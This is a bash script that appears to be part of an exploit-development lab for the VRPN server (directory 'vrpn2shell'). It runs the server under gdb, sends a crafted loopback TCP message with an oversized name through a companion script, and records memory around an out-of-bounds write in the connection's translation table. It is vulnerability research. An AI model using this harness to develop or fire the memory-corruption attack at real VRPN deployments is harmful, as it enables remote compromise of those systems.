#!/usr/bin/env bash
# gdb map of the translation-table OOB write from a real loopback TCP message.
# Usage: probe-xlation-gdb.sh <outdir> <port> <sender> [index]
# Env overrides: BIN, MSGTYPE, NAME. No external hosts.
set -uo pipefail
OUT=${1:?usage: probe-xlation-gdb.sh <outdir> <port> <sender> [index]}
PORT=${2:?port required}
SENDER=${3:?sender required}
IDX=${4:-4}
BIN=${BIN:-lab/frontier/vrpn2shell/build-plain-07.36/server_src/vrpn_server}
MSGTYPE=${MSGTYPE:--1}
NAME=${NAME:-BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB}

cd "$(dirname "$0")/../../.." || exit 2
mkdir -p "$OUT"
{
  echo "date_utc=$(date -u +%FT%TZ)"
  echo "bin=$BIN bin_sha256=$(sha256sum "$BIN")"
  echo "port=$PORT sender=$SENDER index=$IDX msgtype=$MSGTYPE"
} >"$OUT/meta.txt"
cat >"$OUT/gdb.cmd" <<EOF
set pagination off
set confirm off
break vrpn_Connection.C:405
commands
silent
printf "AT405 this=%p d_entry=%p useEntry=%d remote_id=%d local_id=%d name=%p\\n", this, d_entry, useEntry, remote_id, local_id, name
x/4gx &d_entry[useEntry]
continue
end
break vrpn_Connection.C:414
commands
silent
printf "PRE414 useEntry=%d dest=%p name=%p\\n", useEntry, d_entry[useEntry].name, name
x/8gx (char*)d_entry[useEntry].name-32
x/16bx d_entry[useEntry].name
continue
end
break vrpn_Connection.C:415
commands
silent
printf "POST415 useEntry=%d dest=%p\\n", useEntry, d_entry[useEntry].name
x/8gx (char*)d_entry[useEntry].name-32
x/16bx d_entry[useEntry].name
bt 4
continue
end
run -f lab/frontier/vrpn2shell/vrpn.cfg $PORT
EOF
timeout 30s gdb -q -batch -x "$OUT/gdb.cmd" --args "$BIN" \
  >"$OUT/gdb.log" 2>&1 &
GPID=$!
sleep 2
python3 lab/frontier/vrpn2shell/wire_xlation.py \
  --sender "$SENDER" --index "$IDX" --name "$NAME" \
  --port "$PORT" --msgtype "$MSGTYPE" --hold 2.0 \
  >"$OUT/client.txt" 2>&1
wait "$GPID" 2>/dev/null || true
echo "=== $OUT"; cat "$OUT/meta.txt" "$OUT/client.txt"
echo "=== gdb key lines"
grep -E 'AT405|PRE414|POST415|Program received|SIGSEGV|SIGBUS|SIGILL|addRemoteEntry|exited' "$OUT/gdb.log" | head -50
